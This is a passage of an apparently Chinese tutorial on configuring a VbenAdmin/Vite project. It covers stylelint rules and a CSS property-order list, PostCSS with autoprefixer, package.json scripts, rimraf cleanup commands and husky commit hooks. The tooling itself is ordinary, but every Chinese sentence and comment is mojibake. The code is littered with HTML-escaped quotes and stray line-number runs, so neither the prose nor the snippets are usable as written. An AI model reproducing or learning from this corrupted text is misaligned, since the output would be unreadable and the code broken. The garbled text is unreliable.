53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 module.exports = { // ... rules: { // â†“ ç¦æ­¢ä½¿ç”¨æœªçŸ¥çš„å½é¡é¸æ“‡å™¨ã€‚ \u0026#39;selector-pseudo-class-no-unknown\u0026#39;: [ true, { ignorePseudoClasses: [\u0026#39;global\u0026#39;] } ], // â†“ ç¦æ­¢ä½¿ç”¨æœªçŸ¥è¦å‰‡ã€‚ \u0026#39;at-rule-no-unknown\u0026#39;: [ true, { ignoreAtRules: [\u0026#39;function\u0026#39;, \u0026#39;if\u0026#39;, \u0026#39;each\u0026#39;, \u0026#39;include\u0026#39;, \u0026#39;mixin\u0026#39;] } ], // â†“ ç¦æ­¢ç©ºä¾†æºã€‚ \u0026#39;no-empty-source\u0026#39;: null, // â†“ ç¦æ­¢ä½¿ç”¨ç„¡æ•ˆçš„å‘½åç¶²æ ¼å€åŸŸã€‚ \u0026#39;named-grid-areas-no-invalid\u0026#39;: null, // â†“ è¦æ±‚æˆ–ä¸å…è¨±ä½¿ç”¨Unicodeå­—ç¯€é †åºæ¨™è¨˜ã€‚ \u0026#39;unicode-bom\u0026#39;: \u0026#39;never\u0026#39;, // â†“ ç¦æ­¢è¼ƒä½ç‰¹ç•°æ€§çš„é¸æ“‡å™¨åœ¨è¦†è“‹è¼ƒé«˜ç‰¹ç•°æ€§çš„é¸æ“‡å™¨ä¹‹å¾Œå‡ºç¾ã€‚ \u0026#39;no-descending-specificity\u0026#39;: null, // â†“ ç¦æ­¢åœ¨å­—é«”ç³»åˆ—åç¨±åˆ—è¡¨ä¸­ç¼ºå°‘é€šç”¨ç³»åˆ—ã€‚ \u0026#39;font-family-no-missing-generic-family-keyword\u0026#39;: null, // â†“ åœ¨è²æ˜çš„å†’è™Ÿå¾Œé¢éœ€è¦ä¸€å€‹ç©ºæ ¼æˆ–ç¦æ­¢ç©ºæ ¼ã€‚ \u0026#39;declaration-colon-space-after\u0026#39;: \u0026#39;always-single-line\u0026#39;, // â†“ åœ¨è²æ˜çš„å†’è™Ÿä¹‹å‰éœ€è¦ä¸€å€‹ç©ºæ ¼æˆ–ç¦æ­¢ä½¿ç”¨ç©ºæ ¼ã€‚ \u0026#39;declaration-colon-space-before\u0026#39;: \u0026#39;never\u0026#39;, // â†“ åœ¨è²æ˜å¡Šå…§è¦æ±‚æˆ–ä¸å…è¨±å°¾éš¨åˆ†è™Ÿã€‚ \u0026#39;declaration-block-trailing-semicolon\u0026#39;: \u0026#39;always\u0026#39;, // â†“ åœ¨è¦å‰‡ä¹‹å‰è¦æ±‚æˆ–ç¦æ­¢ä½¿ç”¨ç©ºè¡Œã€‚ \u0026#39;rule-empty-line-before\u0026#39;: [ \u0026#39;always\u0026#39;, { ignore: [\u0026#39;after-comment\u0026#39;, \u0026#39;first-nested\u0026#39;], } ], // â†“ ç¦æ­¢ä½¿ç”¨æœªçŸ¥å–®ä½ã€‚ \u0026#39;unit-no-unknown\u0026#39;: [true, { ignoreUnits: [\u0026#39;rpx\u0026#39;] }], // Specify the alphabetical order of the attributes in the declaration block // â†“ æ¨£å¼é †åº \u0026#39;order/properties-order\u0026#39;: [ \u0026#39;position\u0026#39;, \u0026#39;top\u0026#39;, \u0026#39;right\u0026#39;, \u0026#39;bottom\u0026#39;, \u0026#39;left\u0026#39;, \u0026#39;z-index\u0026#39;, \u0026#39;display\u0026#39;, \u0026#39;float\u0026#39;, \u0026#39;width\u0026#39;, \u0026#39;height\u0026#39;, \u0026#39;max-width\u0026#39;, \u0026#39;max-height\u0026#39;, \u0026#39;min-width\u0026#39;, \u0026#39;min-height\u0026#39;, \u0026#39;padding\u0026#39;, \u0026#39;padding-top\u0026#39;, \u0026#39;padding-right\u0026#39;, \u0026#39;padding-bottom\u0026#39;, \u0026#39;padding-left\u0026#39;, \u0026#39;margin\u0026#39;, \u0026#39;margin-top\u0026#39;, \u0026#39;margin-right\u0026#39;, \u0026#39;margin-bottom\u0026#39;, \u0026#39;margin-left\u0026#39;, \u0026#39;margin-collapse\u0026#39;, \u0026#39;margin-top-collapse\u0026#39;, \u0026#39;margin-right-collapse\u0026#39;, \u0026#39;margin-bottom-collapse\u0026#39;, \u0026#39;margin-left-collapse\u0026#39;, \u0026#39;overflow\u0026#39;, \u0026#39;overflow-x\u0026#39;, \u0026#39;overflow-y\u0026#39;, \u0026#39;clip\u0026#39;, \u0026#39;clear\u0026#39;, \u0026#39;font\u0026#39;, \u0026#39;font-family\u0026#39;, \u0026#39;font-size\u0026#39;, \u0026#39;font-smoothing\u0026#39;, \u0026#39;osx-font-smoothing\u0026#39;, \u0026#39;font-style\u0026#39;, \u0026#39;font-weight\u0026#39;, \u0026#39;hyphens\u0026#39;, \u0026#39;src\u0026#39;, \u0026#39;line-height\u0026#39;, \u0026#39;letter-spacing\u0026#39;, \u0026#39;word-spacing\u0026#39;, \u0026#39;color\u0026#39;, \u0026#39;text-align\u0026#39;, \u0026#39;text-decoration\u0026#39;, \u0026#39;text-indent\u0026#39;, \u0026#39;text-overflow\u0026#39;, \u0026#39;text-rendering\u0026#39;, \u0026#39;text-size-adjust\u0026#39;, \u0026#39;text-shadow\u0026#39;, \u0026#39;text-transform\u0026#39;, \u0026#39;word-break\u0026#39;, \u0026#39;word-wrap\u0026#39;, \u0026#39;white-space\u0026#39;, \u0026#39;vertical-align\u0026#39;, \u0026#39;list-style\u0026#39;, \u0026#39;list-style-type\u0026#39;, \u0026#39;list-style-position\u0026#39;, \u0026#39;list-style-image\u0026#39;, \u0026#39;pointer-events\u0026#39;, \u0026#39;cursor\u0026#39;, \u0026#39;background\u0026#39;, \u0026#39;background-attachment\u0026#39;, \u0026#39;background-color\u0026#39;, \u0026#39;background-image\u0026#39;, \u0026#39;background-position\u0026#39;, \u0026#39;background-repeat\u0026#39;, \u0026#39;background-size\u0026#39;, \u0026#39;border\u0026#39;, \u0026#39;border-collapse\u0026#39;, \u0026#39;border-top\u0026#39;, \u0026#39;border-right\u0026#39;, \u0026#39;border-bottom\u0026#39;, \u0026#39;border-left\u0026#39;, \u0026#39;border-color\u0026#39;, \u0026#39;border-image\u0026#39;, \u0026#39;border-top-color\u0026#39;, \u0026#39;border-right-color\u0026#39;, \u0026#39;border-bottom-color\u0026#39;, \u0026#39;border-left-color\u0026#39;, \u0026#39;border-spacing\u0026#39;, \u0026#39;border-style\u0026#39;, \u0026#39;border-top-style\u0026#39;, \u0026#39;border-right-style\u0026#39;, \u0026#39;border-bottom-style\u0026#39;, \u0026#39;border-left-style\u0026#39;, \u0026#39;border-width\u0026#39;, \u0026#39;border-top-width\u0026#39;, \u0026#39;border-right-width\u0026#39;, \u0026#39;border-bottom-width\u0026#39;, \u0026#39;border-left-width\u0026#39;, \u0026#39;border-radius\u0026#39;, \u0026#39;border-top-right-radius\u0026#39;, \u0026#39;border-bottom-right-radius\u0026#39;, \u0026#39;border-bottom-left-radius\u0026#39;, \u0026#39;border-top-left-radius\u0026#39;, \u0026#39;border-radius-topright\u0026#39;, \u0026#39;border-radius-bottomright\u0026#39;, \u0026#39;border-radius-bottomleft\u0026#39;, \u0026#39;border-radius-topleft\u0026#39;, \u0026#39;content\u0026#39;, \u0026#39;quotes\u0026#39;, \u0026#39;outline\u0026#39;, \u0026#39;outline-offset\u0026#39;, \u0026#39;opacity\u0026#39;, \u0026#39;filter\u0026#39;, \u0026#39;visibility\u0026#39;, \u0026#39;size\u0026#39;, \u0026#39;zoom\u0026#39;, \u0026#39;transform\u0026#39;, \u0026#39;box-align\u0026#39;, \u0026#39;box-flex\u0026#39;, \u0026#39;box-orient\u0026#39;, \u0026#39;box-pack\u0026#39;, \u0026#39;box-shadow\u0026#39;, \u0026#39;box-sizing\u0026#39;, \u0026#39;table-layout\u0026#39;, \u0026#39;animation\u0026#39;, \u0026#39;animation-delay\u0026#39;, \u0026#39;animation-duration\u0026#39;, \u0026#39;animation-iteration-count\u0026#39;, \u0026#39;animation-name\u0026#39;, \u0026#39;animation-play-state\u0026#39;, \u0026#39;animation-timing-function\u0026#39;, \u0026#39;animation-fill-mode\u0026#39;, \u0026#39;transition\u0026#39;, \u0026#39;transition-delay\u0026#39;, \u0026#39;transition-duration\u0026#39;, \u0026#39;transition-property\u0026#39;, \u0026#39;transition-timing-function\u0026#39;, \u0026#39;background-clip\u0026#39;, \u0026#39;backface-visibility\u0026#39;, \u0026#39;resize\u0026#39;, \u0026#39;appearance\u0026#39;, \u0026#39;user-select\u0026#39;, \u0026#39;interpolation-mode\u0026#39;, \u0026#39;direction\u0026#39;, \u0026#39;marks\u0026#39;, \u0026#39;page\u0026#39;, \u0026#39;set-link-source\u0026#39;, \u0026#39;unicode-bidi\u0026#39;, \u0026#39;speak\u0026#39; ] } // ... } é…ç½®stylelintå¿½ç•¥æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.stylelintignoreæ–‡ä»¶ .stylelintignore 1 2 /dist/* /public/* é…ç½®Yarnè‡ªå‹•æ¸…é™¤åŠŸèƒ½ èªªæ˜ å¯¦ç¾æ¯ä¸€æ¬¡installä¹‹å¾Œã€addä¹‹å¾Œã€yarn autoclean --forceä¹‹å¾Œã€‚å¾ç¨‹åºåŒ…ä¾è³´é …ä¸­æ¸…é™¤ä¸¦åˆªé™¤ä¸å¿…è¦çš„æ–‡ä»¶ã€‚\nåƒè€ƒéˆæ¥ï¼šyarn autoclean-å®˜æ–¹èªªæ˜\nåˆå§‹åŒ– 1 yarn autoclean --init åŸ·è¡Œå®Œå‘½ä»¤ä¹‹å¾Œï¼ŒYarnå°±æœƒè‡ªå‹•åœ¨æ ¹ç›®éŒ„ä¸‹å‰µå»ºä¸€å€‹.yarncleanæ–‡ä»¶ï¼Œé€™æ¨£å°±å¯ä»¥äº†ã€‚\nå®‰è£PostCSS èªªæ˜ æˆ‘å€‘éœ€è¦å®‰è£å…©å€‹åº«postcssã€autoprefixerã€‚è¦ç¾å¯¦çš„æ•ˆæœå°±æ˜¯æˆ‘å€‘ç·¨å¯«ä¸€èˆ¬çš„æ¨£å¼ï¼Œæ¸²æŸ“é é¢çš„domç¯€é»æœ‰é¢å‘å„ç¨®ç€è¦½å™¨å» å•†çš„æ¨£å¼ã€‚\nç¶²ä¸Šèªªpostcssé¡ä¼¼ä¸€å€‹å¹³å°ï¼Œä¸Šé¢æœ‰å¾ˆå¤šæ’ä»¶ï¼Œautoprefixerå°±å…¶ä¸­ä¸€å€‹ã€‚\næˆ‘ä»¥æˆ‘çš„çœ‹æ³•ä¾†è§£é‡‹ä¸€ä¸‹ï¼špostcsså°±åƒä¸€å€‹ç®¡å­ï¼Œautoprefixeræ˜¯è£¡é¢çš„éæ¿¾å™¨ã€‚ä½ å¯«çš„csså¾ç®¡å­ä¸­æµéï¼Œç¶“éä»–å€‘çš„è™•ç†å°±å‡ºç¾äº†ä¸åŒçš„çµæœã€‚\nåƒè€ƒé€£çµï¼š\nViteé…ç½®PostCss postcssçš„å®˜ç¶² postcssçš„npmé¦–é  autoprefixerçš„npmé¦–é  çŸ¥ä¹autoprefixerèªªæ˜ å®‰è£ 1 yarn add postcss autoprefixer --dev é…ç½®postcss æ ¹ç›®éŒ„ä¸‹ï¼špostcss.config.js postcss.config.js 1 2 3 4 5 module.exports = { plugins: { autoprefixer: {} } } è§£æVbenAdminä¸­çš„script èªªæ˜ VbenAdminå®˜æ–¹æ–‡æª”-npm Script\nä¸€ä¸‹è…³æœ¬ç›´æ¥æ·»åŠ åœ¨æ ¹ç›®éŒ„ä¸‹çš„package.jsonçš„scriptså°è±¡ä¸­å³å¯ã€‚ä¹Ÿå¯ä»¥ç›´æ¥ç…§æ¬VbenAdminçš„ã€‚\nä»¥bootstrapç‚ºä¾‹ã€‚å¦‚ä¸‹ï¼š\n1 2 3 yarn bootstrap # or # npm run bootstrap bootstrap ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;bootstrap\u0026#34;: \u0026#34;yarn install\u0026#34;, // ... } ä½œç”¨ï¼šä½¿ç”¨yarnå®‰è£æ‰€æœ‰ä¾è³´ã€‚\nserve ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;serve\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, // ... } ä½œç”¨ï¼šä»¥é–‹ç™¼ç’°å¢ƒé‹è¡Œé …ç›®ï¼Œä¸¦è¨­ç½®nodeçš„é‹è¡Œå…§å­˜ç‚º4Gã€‚\n--max-old-space-sizeï¼šå–®ä½ç‚ºMB --max-new-space-sizeï¼šå–®ä½ç‚ºKB nodeå‘½ä»¤è¡Œæ–‡æª” npxçš„Gité¦–é ï¼Œæœ‰å‘½ä»¤è¡Œèªªæ˜ \u0026ndash;max-old-space-sizeå‚æ•°è¯´æ˜ dev ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;dev\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, // ... } ä½œç”¨ï¼šåŒserveã€‚\nbuild ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;build\u0026#34;: \u0026#34;vite build\u0026#34;, // ... } ä½œç”¨ï¼šé€™è£¡å…ˆä¸ç®¡ã€‚å…ˆä½¿ç”¨åŸä¾†å‰µå»ºé …ç›®çš„\u0026quot;build\u0026quot;: \u0026quot;vite build\u0026quot;ã€‚å¾Œé¢å®Œæˆäº†viteé…ç½®ä¹‹å¾Œå†è™•ç†é€™å€‹è…³æœ¬ã€‚\nbuild:no-cache ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;build:no-cache\u0026#34;: \u0026#34;yarn clean:cache \u0026amp;\u0026amp; npm run build\u0026#34;, // ... } ä½œç”¨ï¼šæ¸…ç©ºç·©å­˜å¾Œæ§‹å»ºã€‚\nreport ä½œç”¨ï¼šç”Ÿæˆæ‰“åŒ…åˆ†æï¼Œé€™è£¡å…ˆä¸ç®¡ï¼Œç­‰å¾Œé¢é…ç½®viteå†èªªã€‚\npreview ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;preview\u0026#34;: \u0026#34;npm run build \u0026amp;\u0026amp; vite preview\u0026#34;, // ... } ä½œç”¨ï¼šå…ˆæ‰“åŒ…åœ¨é€²è¡Œé è¦½ï¼Œä½¿ç”¨viteè¨ªå•distç›®éŒ„ã€‚\npreview:dist ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;preview:dist\u0026#34;: \u0026#34;vite preview\u0026#34;, // ... } ä½œç”¨ï¼šç›´æ¥é è¦½æœ¬åœ° dist æ–‡ä»¶ç›®éŒ„ã€‚\nlog è©³æƒ…æŸ¥é–±ï¼šä½¿ç”¨conventional-changelog-cliç”Ÿæˆè®Šæ›´è¨˜éŒ„\nä½œç”¨ï¼šç”¨ä¾†ç”Ÿç”¢Gitæäº¤è¨˜éŒ„çš„ã€‚\nclean:cache ä½œç”¨ï¼šåˆªé™¤ç·©å­˜ï¼Œåˆªé™¤node_modules/.cache/å’Œnode_modules/.viteä¸‹çš„æ–‡ä»¶ï¼Œç”±æ–¼åˆªé™¤å‘½ä»¤ä¾è³´é‚„æ²’å®‰è£ï¼Œæ‰€ä»¥å¾Œé¢å†è¬›ã€‚\nclean:lib ä½œç”¨ï¼šæ¸…é™¤ä¾è³´ï¼Œåˆªé™¤node_modulesæ–‡ä»¶å¤¾ï¼Œç”±æ–¼åˆªé™¤å‘½ä»¤ä¾è³´é‚„æ²’å®‰è£ï¼Œæ‰€ä»¥å¾Œé¢å†è¬›ã€‚\nlint:eslint ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:eslint\u0026#34;: \u0026#34;eslint \\\u0026#34;{src,mock}/**/*.{vue,ts,tsx}\\\u0026#34; --fix\u0026#34;, // ... } ä½œç”¨ï¼šåŸ·è¡Œ eslint æ ¡é©—ï¼Œè©²å‘½ä»¤æœƒå°é …ç›®çš„srcã€mockç›®éŒ„ä¸‹çš„vueã€tsã€tsxæ–‡ä»¶é€²è¡Œ eslint æ ¡é©—ï¼Œä¸¦ä¿®å¾©éƒ¨åˆ†å•é¡Œã€‚\nåƒè€ƒé€£çµï¼šeslintå‘½ä»¤è¡Œèªªæ˜\nlint:prettier ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:prettier\u0026#34;: \u0026#34;prettier --write --loglevel warn \\\u0026#34;src/**/*.{js,json,tsx,css,less,scss,vue,html,md}\\\u0026#34;\u0026#34;, // ... } ä½œç”¨ï¼šåŸ·è¡Œ prettier æ ¼å¼åŒ–ä»£ç¢¼ã€‚è©²å‘½ä»¤æœƒå°é …ç›®æ‰€æœ‰ä»£ç¢¼ é€²è¡Œ prettier æ ¼å¼åŒ–ã€‚è¬¹æ…åŸ·è¡Œã€‚\nå¦‚æœä½ çš„vsCodeå®‰è£äº†prettieræ’ä»¶ã€‚é‚£éº¼prettieræ’ä»¶å°±æœƒè®€å–æ ¹ç›®éŒ„ä¸‹çš„prettier.config.jsæ–‡ä»¶ã€‚ç•¶ä½ ä¿å­˜çš„æ™‚å€™å°±æœƒé€²è¡Œæ ¼å¼åŒ–æ–‡ä»¶ã€‚\nä½†æ˜¯éæ˜¯åˆ¥äººæäº¤ä¸Šä¾†çš„æ–‡ä»¶ï¼Œä½ é‚„å»é»é–‹å®ƒçš„æ–‡ä»¶ä¸€å€‹ä¸€å€‹ä¿å­˜éº¼ï¼Ÿæ‰€ä»¥åŸ·è¡Œé€™å€‹å‘½ä»¤ï¼Œå¯ä»¥å°‡srcç›®éŒ„ä¸‹ï¼Œæ‰€æœ‰çš„æ–‡ä»¶æ ¼å¼åŒ–ã€‚\nåƒè€ƒé€£çµï¼šprettierå‘½ä»¤è¡Œèªªæ˜\nlint:stylelint ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:stylelint\u0026#34;: \u0026#34;stylelint --fix \\\u0026#34;**/*.{vue,less,postcss,css,scss}\\\u0026#34; --cache --cache-location node_modules/.cache/stylelint/\u0026#34;, // ... } ä½œç”¨ï¼šæ ¡é©—æ‰€æœ‰æ–‡ä»¶çš„æ¨£å¼æ ¼å¼ï¼Œä¸¦å˜—è©¦ä¿®å¾©ã€‚\nåƒè€ƒé€£çµï¼šstylelintå‘½ä»¤è¡Œè¯´æ˜\nlint:ls-lint ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:ls-lint\u0026#34;: \u0026#34;ls-lint\u0026#34;, // ... } ä½œç”¨ï¼šæ ¡é©—æ‰€æœ‰æ–‡ä»¶å‘½åæ˜¯å¦æ­£ç¢ºã€‚\nlint:lint-staged éœ€å…ˆå‰µå»ºlint-stagedçš„é…ç½®æ–‡ä»¶\nä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34;, // ... } ä½œç”¨ï¼šå°Gitæš«å­˜çš„æ–‡ä»¶é€²è¡Œlintæª¢æŸ¥ã€‚\nlint:pretty éœ€å…ˆå‰µå»ºlint-stagedçš„é…ç½®æ–‡ä»¶\nä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34;, // ... } ä½œç”¨ï¼šå°Gitæš«å­˜æ–‡ä»¶é€²è¡Œprettyçš„æ“ä½œã€‚\ntest:gzip ä½œç”¨ï¼šé€™å€‹å¾Œé¢å†èªªï¼Œhttp-serverçš„npmé¦–é ã€‚\ntest:br ä½œç”¨ï¼šé€™å€‹å¾Œé¢å†èªªï¼Œhttp-serverçš„npmé¦–é ã€‚\nreinstall ä½œç”¨ï¼šé‡æ–°å®‰è£ä¾è³´ï¼Œè©²å‘½ä»¤æœƒå…ˆåˆªé™¤ node_modulesã€yarn.lockã€package.lock.jsonå¾Œåœ¨é€²è¡Œä¾è³´é‡æ–°å®‰è£ï¼Œé€Ÿåº¦æœƒæ˜é¡¯è®Šæ…¢ã€‚\nç”±æ–¼åˆªé™¤å‘½ä»¤ä¾è³´é‚„æ²’å®‰è£ï¼Œæ‰€ä»¥å¾Œé¢å†è¬›ã€‚\ninstall:husky ä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci || husky install\u0026#34;, // ... } ä½œç”¨ï¼šé€™å€‹æ˜¯ç”¨ä¾†åˆå§‹åŒ–huskyçš„ã€‚å•Ÿç”¨Gitæ›é‰¤ã€‚\nèªªæ˜ï¼šå¦‚æœä¸æ˜¯CIæœå‹™å™¨ï¼Œå°±å•Ÿå‹•Gité‰¤å­ã€‚\ngen:icon ä½œç”¨ï¼šç”Ÿæˆåœ–æ¨™çš„ï¼Œå¾Œé¢å†èªªã€‚\npostinstall éœ€å…ˆé…ç½® husky\nä»£ç¢¼ï¼š\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34;, // ... } ä½œç”¨ï¼šåŸ·è¡Œinstall:huskyå‘½ä»¤ã€‚é€™å€‹å‘½ä»¤æœƒè‡ªå‹•å•Ÿå‹•Gité‰¤å­ï¼Œè©²æ“ä½œåƒè€ƒï¼šæ‰‹å‹•åˆå§‹åŒ–huskyå’ŒYarn2ä¸‹æ€éº¼è‡ªå‹•å•Ÿå‹•Gité‰¤å­å‡½æ•¸ã€‚\nå½™ç¸½ package.jsoné™¤è…³æœ¬ã€é‹è¡Œä¾è³´ã€é–‹ç™¼ä¾è³´å¤–çš„å­—æ®µåƒè€ƒå®˜æ–¹æ–‡æª”ã€‚\nyarn -vçš„è…³æœ¬æ˜¯å¾Œé¢è¦èªªçš„è…³æœ¬ã€‚\npackage.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 { // ... \u0026#34;scripts\u0026#34;: { \u0026#34;bootstrap\u0026#34;: \u0026#34;yarn install\u0026#34;, \u0026#34;serve\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, \u0026#34;dev\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, \u0026#34;build\u0026#34;: \u0026#34;vite build\u0026#34;, \u0026#34;build:no-cache\u0026#34;: \u0026#34;yarn clean:cache \u0026amp;\u0026amp; npm run build\u0026#34;, \u0026#34;report\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;preview\u0026#34;: \u0026#34;npm run build \u0026amp;\u0026amp; vite preview\u0026#34;, \u0026#34;preview:dist\u0026#34;: \u0026#34;vite preview\u0026#34;, \u0026#34;log\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;clean:cache\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;clean:lib\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;lint:eslint\u0026#34;: \u0026#34;eslint \\\u0026#34;{src,mock}/**/*.{vue,ts,tsx}\\\u0026#34; --fix\u0026#34;, \u0026#34;lint:prettier\u0026#34;: \u0026#34;prettier --write --loglevel warn \\\u0026#34;src/**/*.{js,json,tsx,css,less,scss,vue,html,md}\\\u0026#34;\u0026#34;, \u0026#34;lint:stylelint\u0026#34;: \u0026#34;stylelint --fix \\\u0026#34;**/*.{vue,less,postcss,css,scss}\\\u0026#34; --cache --cache-location node_modules/.cache/stylelint/\u0026#34;, \u0026#34;lint:ls-lint\u0026#34;: \u0026#34;ls-lint\u0026#34;, \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34;, \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34;, \u0026#34;test:gzip\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;test:br\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;reinstall\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci || husky install\u0026#34;, \u0026#34;gen:icon\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34; }, // ... } å®‰è£rimraf èªªæ˜ ç”±æ–¼æ‰‹å‹•åˆªé™¤æ–‡ä»¶å¤¾å¤ªæ…¢äº†ï¼Œéœ€è¦å¯¦ç¾è…³æœ¬åˆªé™¤æ–‡ä»¶ã€‚\nåƒè€ƒé€£çµ rimrafçš„npmé¦–é \nrimrafçš„npmé¦–é èªªæ˜ï¼š\nThe UNIX command rm -rf for node.\nInstall with npm install rimraf, or just drop rimraf.js somewhere.\nç¿»è­¯ï¼š\nnodeç‰ˆçš„Unixç³»çµ±å‘½ä»¤rm -rfã€‚\nç”¨npmå®‰è£rimrafï¼Œæˆ–è€…ç›´æ¥æŠŠrimraf.jsæ”¾åœ¨æŸå€‹åœ°æ–¹ã€‚\né›–ç„¶é€™è£¡å¯ä»¥é€šéimportä½¿ç”¨å‡½æ•¸åˆªé™¤æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘å€‘ä¸»è¦æ˜¯ä½¿ç”¨å®ƒçš„å‘½ä»¤è¡Œè›¤ã€‚\nè©³æƒ…æŸ¥çœ‹ï¼šrimrafçš„npmé¦–é -Cilèªªæ˜ã€‚\nå®‰è£ 1 yarn add rimraf --dev é‡å¯«è…³æœ¬ å°±æ˜¯æ ¹ç›®éŒ„ä¸‹package.jsonçš„scriptså­—æ®µã€‚\nclean:cache package.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;clean:cache\u0026#34;: \u0026#34;rimraf node_modules/.cache/ \u0026amp;\u0026amp; rimraf node_modules/.vite\u0026#34;, // ... } ç›®çš„ï¼šåˆªé™¤ç·©å­˜ï¼Œåˆªé™¤node_modules/.cache/å’Œnode_modules/.viteä¸‹çš„æ–‡ä»¶ã€‚ clean:lib package.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;clean:lib\u0026#34;: \u0026#34;rimraf node_modules\u0026#34;, // ... } ç›®çš„ï¼šæ¸…é™¤ä¾è³´ï¼Œåˆªé™¤node_modulesæ–‡ä»¶å¤¾ã€‚ reinstall package.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;reinstall\u0026#34;: \u0026#34;rimraf yarn.lock \u0026amp;\u0026amp; rimraf package.lock.json \u0026amp;\u0026amp; rimraf node_modules \u0026amp;\u0026amp; npm run bootstrap\u0026#34;, // ... } ç›®çš„ï¼šé‡æ–°å®‰è£ä¾è³´ï¼Œè©²å‘½ä»¤æœƒå…ˆåˆªé™¤ node_modulesã€yarn.lockã€package.lock.jsonå¾Œåœ¨é€²è¡Œä¾è³´é‡æ–°å®‰è£ï¼Œé€Ÿåº¦æœƒæ˜é¡¯è®Šæ…¢ã€‚ ä½¿ç”¨huskyè¦èŒƒä»£ç¢¼æäº¤ èªªæ˜ ä½¿ç”¨Gitæäº¤ä»£ç¢¼çš„æ™‚å€™ï¼Œéœ€è¦å°æš«å­˜çš„ä»£ç¢¼é€²è¡Œå¦‚ä¸‹æ“ä½œï¼š\né€²è¡Œlintæ“ä½œã€‚ å°commitçš„æ¶ˆæ¯é€²è¡Œæ ¼å¼åŒ–æª¢æŸ¥ã€‚ é€²è¡Œprettieræ“ä½œã€‚ éœ€è¦å®‰è£çš„ä¾è³´æœ‰ï¼šhuskyã€lint-stagedã€@commitlint/cliã€@commitlint/config-conventionalã€pretty-quickã€is-ciã€‚\nhuskyï¼šå¯ä»¥åœ¨Gitçš„é‰¤å­å‡½æ•¸ä¸­åŸ·è¡Œè…³æœ¬ã€‚ lint-stagedï¼šé‡å°æš«å­˜æ–‡ä»¶é€²è¡Œlintæ“ä½œã€‚ @commitlint/cliï¼šå°commitçš„æ¶ˆæ¯é€²è¡Œæ ¼å¼æª¢æŸ¥ã€‚ @commitlint/config-conventionalï¼šcommitçš„æ¶ˆæ¯æª¢æŸ¥æ ¼å¼å‚³çµ±é…ç½®ï¼Œå°æ‡‰é‚„æœ‰å¾ˆå¤šå…¶ä»–é…ç½®ï¼Œæ¯”å¦‚angularçš„æäº¤è¦ç¯„@commitlint/config-angularã€‚ pretty-quickï¼šé‡å°æš«å­˜æ–‡ä»¶é€²è¡Œprettieræ“ä½œã€‚ 